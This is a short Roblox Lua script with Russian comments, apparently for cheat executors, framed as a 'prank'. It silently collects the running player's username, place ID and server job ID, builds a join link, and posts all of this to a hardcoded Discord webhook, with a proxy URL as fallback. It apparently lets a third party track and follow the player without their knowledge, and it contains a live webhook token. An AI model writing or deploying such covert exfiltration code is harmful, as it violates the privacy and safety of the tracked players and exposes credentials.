local httpRequest = (syn and syn.request) or (http and http.request) or request
local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local player = Players.LocalPlayer

-- Собираем данные и URI-ссылку сессии
local placeId = game.PlaceId
local jobId = game.JobId
local uriJoinLink = "roblox://placeId=" .. placeId .. "&gameInstanceId=" .. jobId

local payload = {
    ["content"] = "🎯 **Пранк успешно активирован!**\n" ..
                  "👤 **Ник друга:** " .. player.Name .. "\n" ..
                  "🎮 **ID Плейса:** " .. tostring(placeId) .. "\n\n" ..
                  "👇 **Скопируйте строку ниже и вставьте в окно Win+R:**\n" ..
                  "```" .. uriJoinLink .. "```"
}
local jsonPayload = HttpService:JSONEncode(payload)

-- МЕТОД 1: Прямая отправка в Discord (Самый надежный в читах)
if httpRequest then
    pcall(function()
        httpRequest({
            Url = "https://discord.com/api/webhooks/1549358385453989969/7EmPPu20TXFW0zGaRwEdCUH9e3qhWfhIbsAj8X1wSGXBReLVVHwG632PnMCm8lSIpqeU",
            Method = "POST",
            Headers = {["Content-Type"] = "application/json"},
            Body = jsonPayload
        })
    end)
end

-- МЕТОД 2: Резервная отправка через прокси (Если МЕТОД 1 не сработал)
pcall(function()
    HttpService:PostAsync(
        "https://lewisakura.moe/api/webhooks/1549358385453989969/7EmPPu20TXFW0zGaRwEdCUH9e3qhWfhIbsAj8X1wSGXBReLVVHwG632PnMCm8lSIpqeU",
        jsonPayload,
        Enum.HttpContentType.ApplicationJson
    )
end)

